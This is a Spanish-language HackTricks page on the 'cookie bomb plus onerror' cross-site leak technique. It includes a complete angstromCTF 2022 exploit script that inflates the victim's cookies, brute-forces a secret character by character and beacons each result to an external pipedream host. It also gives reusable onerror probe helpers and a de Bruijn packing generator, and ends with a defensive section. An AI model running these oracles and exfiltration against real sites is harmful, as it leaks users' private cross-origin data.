# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Esta técnica combina:
- Cookie bombing: rellenar el navegador de la víctima con muchas/grandes cookies para el origen objetivo de modo que las solicitudes posteriores alcancen límites del servidor/solicitud (tamaño de cabecera de solicitud, tamaño de URL en redirecciones, etc.).
- Error-event oracle: sondear un cross-origin endpoint con un <script> (u otro subrecurso) y distinguir estados con onload vs onerror.

Idea de alto nivel
- Encuentra un endpoint objetivo cuyo comportamiento difiera para dos estados que quieres probar (por ejemplo, búsqueda “hit” vs “miss”).
- Asegúrate de que la ruta “hit” desencadene una cadena de redirecciones pesada o una URL larga, mientras que la ruta “miss” se mantiene corta. Infla las cabeceras de la solicitud usando muchas cookies de modo que solo la ruta “hit” haga que el servidor falle con un error HTTP (p. ej., 431/414/400). El error hace que se dispare onerror y se convierta en un oráculo para XS-Search.

¿Cuándo funciona esto?
- Puedes hacer que el navegador de la víctima envíe cookies al objetivo (p. ej., las cookies son SameSite=None o puedes establecerlas en un first-party context vía un popup window.open).
- Existe una funcionalidad de la app que puedes abusar para establecer cookies arbitrarias (p. ej., endpoints de “save preference” que convierten entradas controladas por el atacante en Set-Cookie) o para hacer redirecciones post-auth que incorporen datos controlados por el atacante en la URL.
- El servidor reacciona de forma diferente en los dos estados y, con cabeceras/URL infladas, un estado cruza un límite y devuelve una respuesta de error que dispara onerror.

Nota sobre errores del servidor usados como oráculo
- 431 Request Header Fields Too Large se devuelve comúnmente cuando las cookies inflan las cabeceras de la solicitud; 414 URI Too Long o un 400 específico del servidor pueden devolverse para objetivos de solicitud largos. Cualquiera de estos resulta en una carga fallida del subrecurso y dispara onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Ejemplo práctico (angstromCTF 2022)
El siguiente script (de un writeup público) abusa de una funcionalidad que permite al atacante insertar cookies arbitrarias, luego carga un cross-origin search endpoint como script. Cuando la consulta es correcta, el servidor realiza una redirección que, junto con la hinchazón de cookies, excede los límites del servidor y devuelve un estado de error, por lo que script.onerror se dispara; de lo contrario no ocurre nada.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
¿Por qué el popup (window.open)?
- Los navegadores modernos bloquean cada vez más los third‑party cookies. Abrir una ventana top-level hacia el target hace que las cookies sean first‑party, por lo que las respuestas Set-Cookie del target persistirán, permitiendo el paso de cookie-bomb incluso con restricciones sobre third‑party cookies.

Notas 2024–2025 sobre la disponibilidad de cookies
- Chromium-based browsers still commonly send third‑party cookies unless the user or site opts out, but Safari and Firefox block most third‑party cookies by default. Plan for both: (1) use a first‑party cookie planting flow (window.open + auto-submit to a cookie-setting endpoint) and then (2) probe with a subresource that only succeeds when those cookies are sent. If third‑party cookies are blocked, move the probe into a same-site context (e.g., run the oracle in the popup via a same-site gadget and exfiltrate the boolean with postMessage or a beacon to your server).

Generic probing helper
Si ya tienes una forma de establecer muchas cookies en el origen objetivo (first-party), puedes reutilizar este minimal oracle contra cualquier endpoint cuyo success/failure lleve a diferentes resultados de red (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternativa tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Avanzado: de Bruijn–based cookie packing (CTF-proven)
- Cuando la app te permite controlar valores grandes de cookie, puedes empaquetar conjeturas de forma eficiente añadiendo una secuencia de de Bruijn a cada probe. Esto mantiene la sobrecarga por probe pequeña mientras asegura que la rama heavy sea de forma consistente más pesada solo para el prefijo correcto. Generador de ejemplo para |Σ| símbolos de longitud n (cabe en un valor de cookie):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea en la práctica: establecer múltiples cookies cuyos valores sean prefix + deBruijn(k,n). Solo cuando el prefijo probado es correcto, el servidor toma la ruta pesada (por ejemplo, un redirect extra que refleja la cookie o URL larga), lo que, combinado con el cookie bloat, supera los límites y activa onerror. Ver un solver público de LA CTF 2024 que usa este enfoque.

Tips para construir el oracle
- Forzar que el estado “positivo” sea más pesado: encadenar un redirect extra solo cuando el predicado sea verdadero, o hacer que la URL de redirect refleje entrada de usuario sin acotar para que crezca con el prefijo adivinado.
- Inflar headers: repetir cookie bombing hasta observar un error consistente en la ruta “pesada”. Los servidores suelen imponer topes al tamaño de headers y fallarán antes cuando hay muchas cookies presentes.
- Estabilizar: lanzar múltiples operaciones de set-cookie en paralelo y sondear repetidamente para promediar ruido de timing y caché.
- Romper caches y evitar artefactos de pooling: añadir un `#fragment` aleatorio o un `?r=` a las URLs de sondeo, y preferir nombres de ventana distintos cuando se usan bucles con window.open.
- Alternar subrecursos: si `<script>` está filtrado, probar `<link rel=stylesheet>` o `<img>`. El booleano onload/onerror es el oracle; el contenido nunca necesita ser parseado.

Límites comunes de header/URL (umbrales útiles)
- Reverse proxies/CDNs y servidores imponen diferentes topes. A octubre de 2025, Cloudflare documenta 128 KB totales para request headers (y 16 KB para URL) en el edge, así que puede que necesites cookies más grandes o más numerosas cuando los objetivos estén detrás de él. Otras stacks (p. ej., Apache vía LimitRequestFieldSize) suelen estar más cerca de ~8 KB por línea de header y alcanzarán errores antes. Ajusta el tamaño del bomb en consecuencia. [Cloudflare docs show the 128 KB header limit.]

Trucos relacionados de XS-Search
- Oráculos basados en longitud de URL (no se necesitan cookies) pueden combinarse o usarse en su lugar cuando puedas forzar un target de request muy largo:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defensas y hardening
- Hacer indistinguibles las respuestas de éxito/fracaso:
- Evitar redirects condicionales o grandes diferencias en tamaño de respuesta entre estados. Devolver el mismo status, el mismo Content-Type y una longitud de cuerpo similar independientemente del estado.
- Bloquear probes de subrecursos cross-site:
- SameSite cookies: establecer cookies sensibles a SameSite=Lax o Strict para que requests de subrecursos como <script src> no las lleven; preferir Strict para tokens de auth cuando sea posible.
- Fetch Metadata: aplicar una Resource Isolation Policy para rechazar cargas de subrecursos cross-site (p. ej., si Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): establecer CORP: same-origin (o al menos same-site) para endpoints que no deban ser embebidos como subrecursos cross-origin.
- X-Content-Type-Options: nosniff y Content-Type correcto en endpoints JSON/HTML para evitar quirks de load-as-script.
- Reducir la amplificación de header/URL:
- Limitar el número/tamaño de cookies seteadas; sanear funcionalidades que conviertan campos de formulario arbitrarios en Set-Cookie.
- Normalizar o truncar datos reflejados en redirects; evitar embeber strings largos controlados por el atacante en Location URLs.
- Mantener límites del servidor consistentes y fallar de forma uniforme (evitar páginas de error especiales solo para una rama).

Notas
- Esta clase de ataques se discute ampliamente como “Error Events” XS-Leaks. El paso de cookie-bomb es solo una forma conveniente de forzar que una sola rama supere los límites del servidor, produciendo un oracle booleano fiable.



## Referencias
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
